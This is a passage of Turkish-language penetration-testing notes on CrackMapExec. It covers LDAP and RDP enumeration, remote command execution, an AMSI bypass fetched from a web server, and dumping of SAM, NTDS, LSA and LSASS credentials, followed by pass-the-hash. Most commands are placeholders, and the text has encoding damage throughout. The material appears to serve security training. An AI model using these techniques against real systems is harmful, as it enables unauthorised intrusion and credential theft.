| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --nla-screenshot`          | NLA (AÄŸ Seviyesinde Kimlik DoÄŸrulamasÄ±) devre dÄ±ÅŸÄ± ise RDP giriÅŸ ekranÄ±nÄ±n ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r. |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screenshot`              | BaÄŸlantÄ± baÅŸarÄ±lÄ±ysa RDP oturumunun ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r.                                        |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screentime`              | MasaÃ¼stÃ¼ gÃ¶rÃ¼ntÃ¼sÃ¼ iÃ§in bekleme sÃ¼resini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --res RES`                 | Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k belirler (Ã¶rnek format: WIDTHxHEIGHT, varsayÄ±lan: 1024x768).                            |

HenÃ¼z Ã§alÄ±ÅŸmadÄ±klarÄ±mÄ±z varsa onlarÄ± gÃ¶zden geÃ§irelim.

### Enumerating Users and Groups

SMB protokolÃ¼nde yaptÄ±ÄŸÄ±mÄ±z gibi, `LDAP` ile de kullanÄ±cÄ±larÄ± ve gruplarÄ± listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini Ã§Ã¶zÃ¼mleyemezsek LDAP protokol iletiÅŸimlerinin Ã§alÄ±ÅŸmayacaÄŸÄ±nÄ± unutmayÄ±n. Domain DNS sunucularÄ±na baÄŸlanmÄ±yorsak, FQDN'yi `/etc/hosts` dosyasÄ±nda yapÄ±landÄ±rmamÄ±z gerekir


### Ä°lginÃ§ Hesap Ã–zelliklerini NumaralandÄ±rma

`ldap` protokolÃ¼, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± ile hesaplarÄ± tanÄ±mlamamÄ±za yardÄ±mcÄ± olacak birkaÃ§ seÃ§eneÄŸe daha sahiptir ve hatta `adminCount` deÄŸeri `1` olan tÃ¼m hesaplarÄ± sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmÄ±ÅŸsa, kullanÄ±cÄ± geÃ§erli password policy uzunluÄŸuna tabi deÄŸildir, yani daha kÄ±sa bir parolaya sahip olabilir veya hiÃ§ parola kullanmayabilir (domain'de boÅŸ parolalara izin veriliyorsa). Bu hesaplarÄ± tanÄ±mlamak iÃ§in  `--password-notrequired` seÃ§eneÄŸini kullanabiliriz.


### PASSWD_NOTREQD Attribute TanÄ±mlanmasÄ±

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanÄ±rsa, bir servisin altÄ±nda Ã§alÄ±ÅŸtÄ±ÄŸÄ± servis hesabÄ± (kullanÄ±cÄ± veya bilgisayar) Kerberos yetkilendirmesi iÃ§in gÃ¼venilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldÄ±rÄ± tÃ¼rÃ¼ne `Kerberos Unconstrained Delegation` adÄ± verilir. Bu konu hakkÄ±nda daha fazla bilgi edinmek iÃ§in bu [blog](https://adsecurity.org/?p=1667) yazÄ±sÄ±nÄ± okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanÄ±cÄ±yÄ± koruyup korumadÄ±ÄŸÄ±nÄ± belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar iÃ§in ACL permissions'Ä±n bir template'i olarak gÃ¶rev yapar. EÄŸer herhangi bir account ACE'si (Ã¶rneÄŸin, bir attacker tarafÄ±ndan) modified edilirse, bu process tarafÄ±ndan korunan account'larÄ±n ACL permissions'Ä±, `SDProp` process her Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda (default olarak her 60 dakikada bir Ã§alÄ±ÅŸÄ±r, ancak bu sÃ¼re modified edilebilir) templated permission set'e resetlenir. User, adminCount deÄŸeri 0 olarak set edilmiÅŸse veya specified deÄŸilse bu koruma kapsamÄ±na girmez. EÄŸer attribute value 1 olarak set edilmiÅŸse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'larÄ± target olarak arar. Bunlar genellikle privileged account'lardÄ±r ve further access veya full domain compromise ile sonuÃ§lanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandÄ±rma

BazÄ± domain attack'larÄ±, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'Ä±n sizi tanÄ±mlamak iÃ§in kullandÄ±ÄŸÄ± `unique bir ID` numarasÄ±dÄ±r. Domain SID ise domain'i tanÄ±mlayan unique bir ID numarasÄ±dÄ±r. CrackMapExec kullanarak domain SID'i elde etmek iÃ§in `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

BaÄŸÄ±msÄ±z YÃ¶netilen Hizmet HesabÄ± (standalone Managed Service Account) (sMSA), aÅŸaÄŸÄ±dakileri saÄŸlayan yÃ¶netilen bir domain hesabÄ±dÄ±r:

* Otomatik parola yÃ¶netimi.
* BasitleÅŸtirilmiÅŸ service principal name (SPN) yÃ¶netimi.
* YÃ¶netimi diÄŸer yÃ¶neticilere devretme yeteneÄŸi

Bu yÃ¶netilen servis hesabÄ± (MSA) tÃ¼rÃ¼ Windows Server 2008 R2 ve Windows 7'de tanÄ±tÄ±lmÄ±ÅŸtÄ±r.

Group Managed Service Account (gMSA) domain iÃ§inde aynÄ± iÅŸlevselliÄŸi saÄŸlar ancak aynÄ± zamanda bu iÅŸlevselliÄŸi birden fazla sunucuya geniÅŸletir.

Bir gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuma ayrÄ±calÄ±klarÄ±na sahip bir hesabÄ± belirlemek iÃ§in PowerShell'i kullanabiliriz (komut yÃ¼rÃ¼tmeyi bir sonraki bÃ¶lÃ¼mde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


YukarÄ±daki Ã¶rnekte, `engels` kullanÄ±cÄ±sÄ±nÄ±n `PrincipalsAllowedToRetrieveManagedPassword` ayrÄ±calÄ±ÄŸÄ±na sahip olduÄŸunu gÃ¶rebiliriz, bu da `svc_inlaneadm$` gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuyabileceÄŸi anlamÄ±na gelir. gMSA parolasÄ±nÄ± okuma hakkÄ±na sahip bir hesabÄ± tehlikeye atarsak, hesabÄ±n `NTLM` parola hash'ini almak iÃ§in `--gmsa` seÃ§eneÄŸini kullanabiliriz.


### gMSA ParolasÄ±nÄ± Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak iÃ§in, hash'ler iÃ§in -H seÃ§eneÄŸini kullanabiliriz.

### svc_inlaneadm$ HesabÄ± ile PaylaÅŸÄ±lan KlasÃ¶rleri Ä°nceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla kullanÄ±cÄ± adlarÄ±nÄ± numaralandÄ±rmak iÃ§in CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnÄ±zca `NLA` ile izin verme seÃ§eneÄŸi devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸsa, oturum aÃ§ma isteminin ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ almak iÃ§in `--nlascreenshot` seÃ§eneÄŸini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz.


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

EÄŸer bir kullanÄ±cÄ± adÄ± ve parolamÄ±z varsa, `--screenshot` seÃ§eneÄŸi ile RDP protokolÃ¼nÃ¼ kullanarak da ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alabiliriz. Bu seÃ§enek `--screentime` ile birleÅŸtirilebilir, varsayÄ±lan olarak `10`, RDP baÄŸlantÄ±sÄ± aÃ§Ä±ldÄ±ktan sonra ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almak iÃ§in bekleyeceÄŸi sÃ¼redir. Bu, bir hedef makineye baÄŸlandÄ±ÄŸÄ±mÄ±zda ve hedefin masaÃ¼stÃ¼nÃ¼ yÃ¼klemesi 10 saniyeden fazla sÃ¼rdÃ¼ÄŸÃ¼nde kullanÄ±ÅŸlÄ±dÄ±r.

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ seÃ§eneÄŸiyle birleÅŸtirilebilecek bir diÄŸer seÃ§enek de RDP baÄŸlantÄ±sÄ± sÄ±rasÄ±ndaki ekran Ã§Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼ne karÅŸÄ±lÄ±k gelen `--res` seÃ§eneÄŸidir. Bu seÃ§enek yararlÄ±dÄ±r Ã§Ã¼nkÃ¼ aktif bir RDP oturumu bulursak, kullanÄ±cÄ±nÄ±n ekranÄ±nÄ±n boyutuna baÄŸlÄ± olarak tÃ¼m iÃ§eriÄŸi gÃ¶rebiliriz veya gÃ¶remeyiz. VarsayÄ±lan olarak bu seÃ§enek `1024x768` olarak ayarlanmÄ±ÅŸtÄ±r


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteÄŸe baÄŸlÄ± bayraklardÄ±r.

Son olarak, ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz:


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in GÃ¶zÃ¼nÃ¼ Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bÃ¶lÃ¼mde, hedeflerimize ulaÅŸmamÄ±za yardÄ±mcÄ± olabilecek LDAP ve RDP kullanarak Ã§eÅŸitli numaralandÄ±rma seÃ§eneklerini inceledik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼m, CrackMapExec kullanarak komutlarÄ±n nasÄ±l Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± gÃ¶zden geÃ§irecektir.


---

### Command Execution

Remote target Ã¼zerinde local administrator olarak bir komut Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸmadan Ã¶nce `UAC`'nin varlÄ±ÄŸÄ±nÄ± kontrol etmeliyiz. UAC etkinleÅŸtirildiÄŸinde, ki bu varsayÄ±lan durumdur, yalnÄ±zca `RID 500`'e sahip administrator hesabÄ± (varsayÄ±lan administrator) remote komutlarÄ± yÃ¼rÃ¼tebilir. Durumun bÃ¶yle olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in iki registry key vardÄ±r:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

VarsayÄ±lan olarak, `LocalAccountTokenFilterPolicy` deÄŸeri 0 olarak ayarlanmÄ±ÅŸtÄ±r, yani yalnÄ±zca built-in administrator hesabÄ± (RID 500) administration gÃ¶revlerini gerÃ§ekleÅŸtirebilir. Local administrator grubunda olsak bile, yalnÄ±zca kullanÄ±cÄ±mÄ±zÄ±n RID'si `500` ise remote komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. DeÄŸer 1 olarak ayarlanÄ±rsa tÃ¼m administrative hesaplarÄ± yÃ¶netim gÃ¶revlerini yÃ¼rÃ¼tebilir.

Administrator yapÄ±landÄ±rabileceÄŸi bir diÄŸer ayar da local administrator hesabÄ±nÄ±n (RID 500) remote yÃ¶netim gÃ¶revlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry deÄŸerini 1 olarak ayarlayarak yapÄ±labilir; bu, built-in administrator hesabÄ±nÄ±n (RID 500) remote administrative tasks (remote yÃ¶netim gÃ¶revleri) gerÃ§ekleÅŸtiremeyeceÄŸi anlamÄ±na gelir.


### Administrator Olarak Komut YÃ¼rÃ¼tme

KomutlarÄ± Ã§alÄ±ÅŸtÄ±rmak ve administrators grubuna kimlerin Ã¼ye olduÄŸunu gÃ¶rmek iÃ§in Administrator hesabÄ±nÄ± kullanalÄ±m. Windows komut satÄ±rÄ± komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in `-x` seÃ§eneÄŸini ve ardÄ±ndan Ã§alÄ±ÅŸtÄ±rmak istediÄŸimiz komutu kullanmamÄ±z gerekir.


### Bir Komutu Administrator Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut YÃ¼rÃ¼tme

YukarÄ±daki komutta, `localadmin` local user `Administrators` grubundadÄ±r, ancak remote komutu Ã§alÄ±ÅŸtÄ±ramaz:

### Komutu localadmin olarak Ã§alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduÄŸu anlamÄ±na gelir. EÄŸer durum bÃ¶yleyse, hesap administrator olsa bile (Pwn3d!) mesajÄ±nÄ± almayacaÄŸÄ±z. Bu ayarÄ± geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi DeÄŸiÅŸtirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain HesabÄ± Olarak Komut YÃ¼rÃ¼tme

`LocalAccountTokenFilterPolicy` yalnÄ±zca local hesaplar iÃ§in geÃ§erlidir. Bir domain kullanÄ±cÄ±mÄ±z varsa ve `administrators` grubunun bir parÃ§asÄ±ysa, UAC ayarÄ±yla bile komutu Ã§alÄ±ÅŸtÄ±rabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabÄ± `administrators` `grubunun` bir Ã¼yesidir, yani UAC etkin olsa bile komutlarÄ± yÃ¼rÃ¼tebilir.


### Komutu Robert olarak Ã§alÄ±ÅŸtÄ±r

{{CODE_BLOCK_153}}


### SMB ile Komut YÃ¼rÃ¼tme

CME'nin dÃ¶rt (4) farklÄ± komut yÃ¼rÃ¼tme yÃ¶ntemi vardÄ±r:

| Komut   | AÃ§Ä±klama                                                                                                                             |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| wmiexec | WMI (Windows Management Instrumentation) kullanÄ±larak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`diskte dosya oluÅŸturulur`).                               |
| atexec  | Windows `gÃ¶rev zamanlayÄ±cÄ±sÄ±` ile bir gÃ¶rev planlayarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz). |
| smbexec | Bir servis oluÅŸturup Ã§alÄ±ÅŸtÄ±rarak komutlar yÃ¼rÃ¼tÃ¼lÃ¼r (`fileless`, ancak Windowsâ€™un en son sÃ¼rÃ¼mÃ¼nde Ã§alÄ±ÅŸmaz).                       |
| mmcexec | wmiexec yÃ¶ntemine benzer, ancak komutlar Microsoft YÃ¶netim Konsolu (MMC) aracÄ±lÄ±ÄŸÄ±yla yÃ¼rÃ¼tÃ¼lÃ¼r.                                     |

Not: Her yÃ¶ntem her bilgisayarda Ã§alÄ±ÅŸmayabilir.

VarsayÄ±lan olarak, CME biri baÅŸarÄ±sÄ±z olursa farklÄ± bir yÃ¼rÃ¼tme yÃ¶ntemine geÃ§ecektir. KomutlarÄ± aÅŸaÄŸÄ±daki sÄ±rayla yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸÄ±r:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnÄ±zca bir yÃ¼rÃ¼tme yÃ¶ntemi kullanmaya zorlamak istiyorsak, Ã¶rneÄŸin `--exec-method` bayraÄŸÄ±nÄ± kullanarak hangisini kullanacaÄŸÄ±mÄ±zÄ± belirtebiliriz:


### SMBExec YÃ¶ntemi ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seÃ§eneÄŸini kullanarak PowerShell ile komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz:

### wmiexec aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_155}}


PowerShell seÃ§eneÄŸi -X Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, perde arkasÄ±nda `CrackMapExec` aÅŸaÄŸÄ±dakileri yapacaktÄ±r:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Ã–zel AMSI Bypass Ã‡alÄ±ÅŸtÄ±rma

Bu teknikler `PowerShell` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken algÄ±lanabilir. Ã–zel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seÃ§eneÄŸini ve ardÄ±ndan kullanmak istediÄŸimiz payload'un yolunu kullanabiliriz. Ã–rneÄŸin, [AMSI Bypass DeÄŸiÅŸtirilmiÅŸ Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) YamasÄ±nÄ± kullanalÄ±m. Bunu bir dosyaya kaydedeceÄŸiz ve bu AMSI Bypass'Ä± bir web sunucusundan belleÄŸe yÃ¼klemek iÃ§in bir PowerShell scripti oluÅŸturacaÄŸÄ±z. Ä°ÅŸte adÄ±mlar:

*  â€œModified Amsi ScanBuffer Patchâ€ iÃ§eren dosyayÄ± indirin


### â€œModified Amsi ScanBuffer Patchâ€ ile Bir Dosya OluÅŸturun

{{CODE_BLOCK_156}}


Payload'u olduÄŸu gibi Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸÄ±rsak, komut maksimum uzunluk olan 8191 karakteri aÅŸacaÄŸÄ± iÃ§in baÅŸarÄ±sÄ±z olacaktÄ±r

### Komut Maksimum UzunluÄŸu AÅŸÄ±yor

{{CODE_BLOCK_157}}

* Bu sorunu Ã§Ã¶zmek iÃ§in, `shantanukhande-amsi.ps1` dosyasÄ±nÄ± indiren ve Ã§alÄ±ÅŸtÄ±ran bir PowerShell scripti oluÅŸturalÄ±m. AyrÄ±ca scriptimizi barÄ±ndÄ±rmak iÃ§in bir Python web sunucusu oluÅŸturmamÄ±z gerekecek.

### PowerShell Komut DosyasÄ±nÄ± OluÅŸturma ve BarÄ±ndÄ±rma

{{CODE_BLOCK_158}}


Not: Sonuna noktalÄ± virgÃ¼l (;) eklediÄŸinizden emin olun.

BaÅŸka bir terminalden, yeni AMSI bypass payload'umuzu Ã§alÄ±ÅŸtÄ±ralÄ±m:

### PowerShell Ã–zel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut YÃ¼rÃ¼tme

WinRM protokolÃ¼ ile de komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. VarsayÄ±lan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yÄ± dinler. Bu protokolle ilgili Ã¶zel bir ÅŸey, bir kullanÄ±cÄ±nÄ±n komutlarÄ± yÃ¼rÃ¼tmek iÃ§in `administrator` olmasÄ±nÄ± gerektirmemesidir. `Administrators` grubunun Ã¼yesiysek, `Remote Management Users` grubunun Ã¼yesiysek veya oturum yapÄ±landÄ±rmasÄ±nda aÃ§Ä±k `PowerShell Remoting` izinlerimiz varsa WinRM protokolÃ¼nÃ¼ kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yÃ¼rÃ¼tme ile kullanabileceÄŸimiz Ã§eÅŸitli seÃ§enekler vardÄ±r. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

| SeÃ§enek           | AÃ§Ä±klama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM baÄŸlantÄ±sÄ± iÃ§in Ã¶zel bir port seÃ§mek.             |
| --ssl             | SSL etkinleÅŸtirilmiÅŸ WinRM'ye baÄŸlanmak.                |
| --ignore-ssl-cert | SSL ile baÄŸlanÄ±rken sertifika doÄŸrulamasÄ±nÄ± yok saymak. |

Not: WinRM protokolÃ¼ farklÄ± yÃ¼rÃ¼tme yÃ¶ntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows Ã¼zerinde komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in SSH protokolÃ¼nÃ¼ de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileÅŸime girmenin bir baÅŸka yaygÄ±n yolu da `public` ve `private` keyleri kullanmaktÄ±r. CrackMapExec, `--key-file` seÃ§eneÄŸi ile `private key` kullanÄ±mÄ±nÄ± destekler. AnahtarÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in `OPENSSH` formatÄ±nda olmasÄ± gerekir.

### Private Key Kullanarak SSH ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, `-p` seÃ§eneÄŸini boÅŸ `(â€œâ€)` olarak ayarlamalÄ±yÄ±z, aksi takdirde bir hata alÄ±rÄ±z

Bu bÃ¶lÃ¼mde, CrackMapExec kullanarak komutlarÄ± yÃ¼rÃ¼tmek iÃ§in Ã¼Ã§ farklÄ± protokol keÅŸfettik ve daha Ã¶nce komutlarÄ± yÃ¼rÃ¼tmek iÃ§in MSSQL'in nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± tartÄ±ÅŸtÄ±k. YazÄ±m sÄ±rasÄ±nda, CrackMapExec komutlarÄ± yÃ¼rÃ¼tmek iÃ§in diÄŸer dÃ¶rt protokolÃ¼ desteklemektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in kimlik bilgilerini ayÄ±klamak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± tartÄ±ÅŸÄ±lacaktÄ±r.


### Gizli Bilgileri Bulma ve Kullanma

Parola Ã§Ä±karma sÃ¶z konusu olduÄŸunda, CrackMapExec oldukÃ§a gÃ¼Ã§lÃ¼dÃ¼r. On workstation ele geÃ§irdiÄŸimizi ve tÃ¼mÃ¼nden kimlik bilgilerini almak iÃ§in LSASS process'inin belleÄŸini dump istediÄŸimizi dÃ¼ÅŸÃ¼nelim; CrackMapExec bunu yapabilir.

Bu bÃ¶lÃ¼mde, CrackMapExec'in Windows kimlik bilgilerini dump iÃ§in sunduÄŸu yÃ¶ntemleri inceleyeceÄŸiz.


### SAM

SAM database, tÃ¼m local kullanÄ±cÄ±larÄ±n kimlik bilgilerini iÃ§erir ve birÃ§ok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandÄ±ÄŸÄ± iÃ§in bunlarÄ± ele geÃ§irmek kritik Ã¶neme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanÄ±labilen `--sam` seÃ§eneÄŸini kullanarak SAM database iÃ§eriÄŸini hÄ±zlÄ± bir ÅŸekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alÄ±nabileceÄŸi bir baÅŸka yer de Active Directory veritabanÄ±dÄ±r. ntds.dit dosyasÄ±, kullanÄ±cÄ± objeleri, gruplar ve grup Ã¼yeliÄŸi hakkÄ±ndaki bilgiler de dahil olmak Ã¼zere Active Directory verilerini depolayan bir veritabanÄ±dÄ±r. Ã–zellikle, dosya aynÄ± zamanda domain'deki tÃ¼m kullanÄ±cÄ±lar iÃ§in parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap iÃ§in [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleÅŸtirilmiÅŸse aÃ§Ä±k metin parolalarÄ±nÄ± da saklar). Bir Domain Admin hesabÄ±na veya bir replikasyon/DCSync gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahip baÅŸka bir hesaba eriÅŸimimiz varsa, bir Domain Controller'dan hash'leri dÃ¶kebiliriz

Hash'leri dump etmek iÃ§in `--ntds` seÃ§eneÄŸini kullanmamÄ±z gerekir, aÅŸaÄŸÄ±daki Ã¶rnekte `robert` kullanÄ±cÄ±sÄ± bir Domain Admin deÄŸildir, ancak `replikasyon` gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahiptir.

### Domain Controller Ã¼zerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seÃ§eneÄŸini kullanÄ±rken `--user` ve `--enabled` seÃ§eneklerini dahil edebiliriz. EÄŸer `--user` kullanÄ±rsak ayÄ±klamak istediÄŸimiz kullanÄ±cÄ±yÄ± belirtebiliriz. KRBTGT hesabÄ± iÃ§in hash dump alalÄ±m.

### YalnÄ±zca KRBTGT HesabÄ±nÄ±n Dump Edilmesi

{{CODE_BLOCK_166}}

EÄŸer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanÄ±cÄ±larÄ± gÃ¶sterecek ve bize etkin kullanÄ±cÄ±larÄ±n listesini Ã§Ä±karma seÃ§eneÄŸi sunacaktÄ±r.


### YalnÄ±zca Enabled HesaplarÄ± GÃ¶sterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiÄŸimiz ÅŸifreler NTLM hash'leridir. Hash'leri kÄ±rmayÄ± deneyebilir veya parolayÄ± kÄ±rmadan kullanÄ±cÄ± olarak kimlik doÄŸrulamasÄ± yapmak iÃ§in `Pass the Hash` tekniÄŸini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doÄŸrulama yÃ¶ntemi olarak bir NTLM hash'i gerektiren `-H` seÃ§eneÄŸine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doÄŸrulamasÄ± SMB, WinRM , RDP, LDAP ve MSSQL protokolleri iÃ§in desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent Ã§alÄ±ÅŸtÄ±rmadan hash dump iÅŸlemi gerÃ§ekleÅŸtiren `impacket-secretsdump`'tan alÄ±nmÄ±ÅŸ `--lsa` seÃ§eneÄŸiyle birlikte gelir. Bu seÃ§enek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak Ã¼zere LSA Secrets'Ä± dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafÄ±ndan kullanÄ±lan kritik veriler iÃ§in benzersiz bir korumalÄ± depolama alanÄ±dÄ±r. LSA, bir sistemin local security policy'sini yÃ¶netmek, denetlemek, kimlik doÄŸrulamak, kullanÄ±cÄ±larÄ±n sistemde oturumunu aÃ§mak, Ã¶zel verileri depolamak vb. iÃ§in tasarlanmÄ±ÅŸtÄ±r. KullanÄ±cÄ±larÄ±n ve sistemlerin hassas verileri gizli dosyalarda saklanÄ±r. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarlarÄ± verileri ÅŸifrelemek iÃ§in kullanÄ±lÄ±r


### LSA'yÄ± inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile baÅŸlayan hash formatÄ± `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayÄ±f bir parola belirlenmiÅŸse `Hashcat` kullanÄ±larak kÄ±rÄ±labilir Ã§Ã¼nkÃ¼ bu algoritma `NTLM`'den Ã§ok daha gÃ¼Ã§lÃ¼dÃ¼r. AyrÄ±ca, Domain Cached Credential hash'leri `Pas the Hash` saldÄ±rÄ±sÄ± iÃ§in kullanÄ±lamaz. BunlarÄ± kÄ±rmak iÃ§in, domain ve kullanÄ±cÄ± adÄ±nÄ± kaldÄ±rmamÄ±z, `$DCC2$` 'den sonraki deÄŸeri almamÄ±z ve Hashcat modÃ¼l 2100'Ã¼ kullanmamÄ±z gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleÄŸi, Windows parolalarÄ±nÄ± `aÃ§Ä±k metin` olarak veya `NTLM` veya `AES256/AES128` gibi diÄŸer hash biÃ§imlerini iÃ§erir. BelleÄŸi dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak iÃ§in etkili bir yol olabilir.

CrackMapExec, LSASS process belleÄŸinin iÃ§eriÄŸini dump etmek iÃ§in Ã§eÅŸitli modÃ¼ller iÃ§erir. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

